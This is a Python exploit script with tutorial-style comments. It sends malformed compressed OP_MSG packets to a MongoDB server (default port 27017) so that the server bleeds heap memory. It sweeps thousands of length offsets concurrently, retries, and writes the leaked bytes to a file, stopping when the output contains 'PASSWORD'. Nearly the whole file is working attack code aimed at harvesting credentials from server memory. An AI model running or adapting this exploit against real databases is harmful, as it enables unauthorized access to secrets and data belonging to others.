'''
Notes

- struct.pack / struct.unpack
  - Purpose: Convert between Python values and C-like binary layouts.
  - Endianness: '<' = little-endian. Formats used here:
    - '<i' = 4-byte signed int (BSON length).
    - '<I' = 4-byte unsigned int (Mongo headers/opcodes, message lengths).
  - Example: struct.pack('<IIII', a, b, c, d) builds a 16-byte Mongo header.

- concurrent.futures.ThreadPoolExecutor / as_completed
  - ThreadPoolExecutor(n): Runs callables concurrently in a pool of n threads.
  - submit(fn, ...): Returns a Future representing the async execution.
  - as_completed(iterable_of_futures): Yields futures as they finish (not in submit order).

- socket.create_connection
  - Opens a TCP socket to (host, port) with timeout; returns a connected socket.
  - Used with sendall(...) to write all bytes, and recv(n) to read up to n bytes.

- bytearray vs bytes
  - bytearray: mutable buffer efficient for incremental appends (extend, etc.).
  - bytes: immutable snapshot; convert via bytes(bytearray_obj) when done.

'''


# Constants only; imports are self-explanatory
import argparse
import os
import socket
import struct
import time
import zlib
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path

# Constants
OP_MSG = 2013
OP_COMPRESSED = 2012
COMPRESSOR_ZLIB = 2
HEADER_SIZE = 16
COMPRESSED_HEADER_SIZE = 9
SIZE_PAD = 500


# [1] Helper: read exactly n bytes from a socket
def _recv_exact(s: socket.socket, n: int) -> bytes:
    # Loop until n bytes are read or the socket closes
    buf = bytearray()
    while len(buf) < n:
        chunk = s.recv(n - len(buf))
        if not chunk:
            raise ConnectionError('socket closed')
        buf.extend(chunk)
    return bytes(buf)

# [2] probe: craft payload, send, read
def probe(host: str, port: int, doc_len: int, timeout: float) -> bytes:

    # doc_len helps us shift the offset
    #   - Expected uncompressed body (per OP_MSG): expected = Overhead + doc_len
    #   - Claimed uncompressed size (OP_COMPRESSED): uncompressedSize = doc_len + SIZE_PAD
    #   - Actual provided after decompress: Overhead + tiny_bson_len
    #   - Bleed = uncompressedSize − expected = (doc_len + SIZE_PAD) − (Overhead + doc_len) = SIZE_PAD − Overhead

    bson = struct.pack('<i', doc_len) + b'\x10a\x00\x01\x00\x00\x00'
    payload = (struct.pack('<I', OP_MSG) + 
        # OP_COMPRESSED inner compressed header fields:
        # - originalOpcode (we claim OP_MSG)
        # - uncompressedSize (we claim doc_len + SIZE_PAD; SIZE_PAD drives bleed length)
        struct.pack('<i', doc_len + SIZE_PAD) + 
        bytes([COMPRESSOR_ZLIB]) + 
        zlib.compress(struct.pack('<I', 0) + b'\x00' + bson)
    )

    try:
        with socket.create_connection((host, port), timeout=timeout) as s:
            # Send compressed OP_COMPRESSED(OP_MSG) and read a full length-prefixed reply
            header = struct.pack('<IIII', HEADER_SIZE + len(payload), 1, 0, OP_COMPRESSED)
            s.sendall(header + payload)
            prefix = _recv_exact(s, 4)
            msg_len = struct.unpack('<I', prefix)[0]
            rest = _recv_exact(s, msg_len - 4)
            response = prefix + rest

        # [3] Unwrap inner message (decompress if server replied compressed)
        opcode = struct.unpack('<I', response[12:16])[0]
        if opcode == OP_COMPRESSED:
            raw = zlib.decompress(response[HEADER_SIZE + COMPRESSED_HEADER_SIZE :])
        else:
            raw = response[HEADER_SIZE:]
        return raw
    except Exception:
        return b""

# [4] run_exploit: sweep lengths concurrently
def run_exploit(host: str, port: int, max_offset: int, concurrency: int, timeout: float) -> str:
    # Use different claimed BSON lengths to shift read offsets (I/O-bound → threads help)
    seen = set()
    # Accumulate all unique leaked bytes across successful probes
    out = bytearray()
    
    # Create a thread pool to run probes concurrently
    with ThreadPoolExecutor(concurrency) as pool:
        # Submit one job per length in [20, max_offset) (different offsets)
        jobs = {
            pool.submit(probe, host, port, length, timeout): length
            for length in range(20, max_offset)
        }
        # [5] Collect unique chunks as futures complete (fastest first)
        for fut in as_completed(jobs):
            try:
                chunk = fut.result()
                # Skip empty replies and chunks already collected
                if not chunk or chunk in seen:
                    continue
                seen.add(chunk)
                # Append raw bytes and a newline for readability
                out.extend(chunk)
                out.extend(b"\n")
            except Exception:
                # Ignore individual probe failures; keep collecting others
                pass
    
    # Decode bytes to text; replace undecodable sequences
    return out.decode('utf-8', errors='replace')

# [6] main: parse args, orchestrate attempts
def main() -> None:
    # Parse CLI options
    p = argparse.ArgumentParser()
    p.add_argument('--host', default='localhost')
    p.add_argument('--port', type=int, default=27017)
    p.add_argument('--max-offset', type=int, default=50000)
    p.add_argument('--output', default='leaked.txt')
    p.add_argument('--concurrency', type=int, default=50)
    p.add_argument('--timeout', type=float, default=2.0)
    p.add_argument('--retries', type=int, default=5)
    args = p.parse_args()

    # Prepare output target and best-effort accumulator
    output_path = Path(os.path.abspath(args.output))
    best = ""
    # [7] Retry loop: run exploit sweeps
    for attempt in range(1, args.retries + 1):
        print(f"- Attempt {attempt}/{args.retries} | scanning {args.host}:{args.port}...")
        t0 = time.time()
        result = run_exploit(
            args.host, args.port, args.max_offset, args.concurrency, args.timeout
        )
        elapsed = time.time() - t0
        # [8] Success: if hit, save and exit early
        if "PASSWORD" in result:
            output_path.write_text(result)
            print(f"Found PASSWORD in {elapsed:.1f}s -> {output_path}")
            break
        # Keep the longest capture so far as a fallback
        if len(result) > len(best):
            best = result
        print(f"Completed in {elapsed:.1f}s (no PASSWORD)")
    else:
        # [9] Fallback: save best-effort output
        output_path.write_text(best)
        print(f"No PASSWORD found. Output saved to {output_path}")


if __name__ == '__main__':
    main()
